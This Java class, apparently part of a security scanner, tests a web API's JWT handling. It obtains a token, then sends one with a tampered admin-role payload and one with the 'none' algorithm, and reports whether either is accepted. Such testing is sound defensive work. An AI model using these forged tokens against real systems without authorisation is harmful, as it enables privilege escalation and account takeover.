package attacks;

import model.AttackResult;
import util.HttpUtil;

public class JwtTokenAttack {

    public static AttackResult run(String baseUrl) {

        // Try to login first to get a token
        String loginPayload = """
        {
          "username": "testuser",
          "password": "TestPassword123!"
        }
        """;

        String loginResponse = HttpUtil.post(baseUrl + "/login", loginPayload);
        
        // Extract token if present
        String token = extractToken(loginResponse);
        
        if (token == null || token.isEmpty()) {
            return new AttackResult("JWT Token Security", false, 
                "Could not obtain JWT token for testing. Authentication may not use JWT or credentials invalid");
        }

        // Test 1: Check if token can be decoded (should always be possible)
        // Test 2: Try using "none" algorithm
        String[] parts = token.split("\\.");
        if (parts.length != 3) {
            return new AttackResult("JWT Token Security", false, 
                "Token format unexpected. May not be a JWT token");
        }

        // Test with tampered token (change payload)
        String tamperedToken = parts[0] + ".eyJ1c2VySWQiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiJ9." + parts[2];
        
        String authResponse = HttpUtil.getWithAuth(baseUrl + "/api/auth/me", tamperedToken);
        
        if (authResponse.contains("success") || authResponse.contains("admin") || 
            (!authResponse.contains("401") && !authResponse.contains("403") && !authResponse.contains("invalid"))) {
            
            return new AttackResult("JWT Token Security", true, 
                "JWT token validation vulnerability. Tampered token accepted. Signature not properly verified");
        }

        // Test with "none" algorithm token
        String noneAlgHeader = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"; // {"alg":"none","typ":"JWT"}
        String noneToken = noneAlgHeader + "." + parts[1] + ".";
        
        authResponse = HttpUtil.getWithAuth(baseUrl + "/api/auth/me", noneToken);
        
        if (authResponse.contains("success") || 
            (!authResponse.contains("401") && !authResponse.contains("403") && !authResponse.contains("invalid"))) {
            
            return new AttackResult("JWT Token Security", true, 
                "Critical JWT vulnerability. 'none' algorithm accepted. Tokens can be forged without signature");
        }

        return new AttackResult("JWT Token Security", false, 
            "JWT tokens properly validated. Tampered tokens and 'none' algorithm rejected");
    }

    private static String extractToken(String response) {
        // Simple token extraction - looks for JWT pattern
        if (response.contains("token")) {
            int tokenStart = response.indexOf("token") + 8;
            int nextQuote = response.indexOf("\"", tokenStart);
            if (nextQuote > tokenStart) {
                String possibleToken = response.substring(tokenStart, nextQuote);
                if (possibleToken.split("\\.").length == 3) {
                    return possibleToken;
                }
            }
        }
        return null;
    }
}
